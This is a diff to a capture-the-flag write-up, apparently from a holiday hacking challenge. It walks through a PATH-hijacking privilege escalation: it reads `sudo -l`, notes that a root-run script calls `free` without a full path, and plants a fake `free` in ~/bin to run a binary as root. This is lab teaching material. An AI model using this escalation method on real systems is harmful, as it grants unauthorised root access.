@@ -24,17 +24,19 @@ Difficulty: :material-star::material-star-outline::material-star-outline::materi
 
 ??? tip "Path Hijacking"
 
-    Be careful when writing scripts that allow regular users to run them. One thing to be wary of is {=not using full paths to executables...these can be hijacked.=}
+    Be careful when writing scripts that allow regular users to run them. One thing to be wary of is not using full paths to executables...these can be hijacked.
 
 ??? tip "What Are My Powers?"
 
-    You know, Sudo is a REALLY powerful tool. It allows you to run executables as ROOT!!! There is even a handy {=switch that will tell you what powers your user has.=}
+    You know, Sudo is a REALLY powerful tool. It allows you to run executables as ROOT!!! There is even a handy switch that will tell you what powers your user has.
 
 ## Solution
 
-??? success "Solution to question 1"
+We need to execute the script `runtoanswer` as root to solve this challenge.
 
-```
+We can check allowed commands for the invoking user using `sudo -l` (see hints):
+
+```sh
 🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo -l
 Matching Defaults entries for chiuser on 7ff5c7a0bc86:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH
@@ -43,12 +45,9 @@ User chiuser may run the following commands on 7ff5c7a0bc86:
     (root) NOPASSWD: /usr/local/bin/system_status.sh
 ```
 
-```
-🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ $PATH
-bash: /home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
-```
+This shows us that we can run a script named `system_status.sh` as root. Let's have a look what this script contains:
 
-```
+```sh
 🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ cat /usr/local/bin/system_status.sh
 #!/bin/bash
 echo "=== Dosis Neighborhood Fire Alarm System Status ==="
@@ -68,7 +67,18 @@ echo "🚨 Emergency Response: Ready"
 echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
 ```
 
+We see usage of commands such as `free` and `df` without pointing to the actual binary, meaning the script relies on the `$PATH` variable to find the correct binaries. By creating our own malicious binary with the same name and placing it in a folder that listed before the folder of the legitimate binary in `$PATH`, we can hijack the execution. Since we can execute the script as root, we can then also execute other commands as root. This is called [Path Hijacking](https://attack.mitre.org/techniques/T1574/007/).
+
+The `$PATH` variable looks as follows:
+
+```sh
+🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ $PATH
+bash: /home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
 ```
+
+We see that the `bin` folder in the user's home folder is checked first. Since we are logged in as that user, we can place our binary in there. Let's test this functionality with a placeholder command `echo`:
+
+```sh
 🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo "echo 'path hijack'" > free
 🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ chmod +x free
 🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ /usr/local/bin/system_status.sh
@@ -78,31 +88,24 @@ Fire alarm system monitoring active...
 System resources (for alarm monitoring):
 path hijack
 
-Disk usage (alarm logs and recordings):
-Filesystem      Size  Used Avail Use% Mounted on
-overlay         296G   16G  268G   6% /
-tmpfs            64M     0   64M   0% /dev
-shm              64M     0   64M   0% /dev/shm
-/dev/sda1       296G   16G  268G   6% /etc/hosts
-tmpfs            16G     0   16G   0% /proc/acpi
-tmpfs            16G     0   16G   0% /sys/firmware
-
-Active fire department connections:
- 18:45:36 up 21:17,  0 users,  load average: 0.09, 0.15, 0.11
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-
-Fire alarm monitoring processes:
-chiuser       41  0.0  0.0   3472  1608 pts/0    S+   18:45   0:00 grep -E (alarm|fire|monitor|safety)
-
-🔥 Fire Safety Status: All systems operational
-🚨 Emergency Response: Ready
-📍 Coverage Area: Dosis Neighborhood (all sectors)
+...
 ```
 
-```
-🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo "echo './runtoanswer'" > free
-🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh
-```
+??? success "Solution"
+
+    Using Path Hijacking, we can execute the `./runtoanswer` binary as root and solve the challenge:
+
+    ``` sh
+    🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ echo "echo './runtoanswer'" > free
+    🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo /usr/local/bin/system_status.sh
+    ```
+
+## Images
+
+![answer](../media/fire_alarm/fire_alarm_1)
+/// caption
+Challenge terminal.
+///
 
 ## Response
 
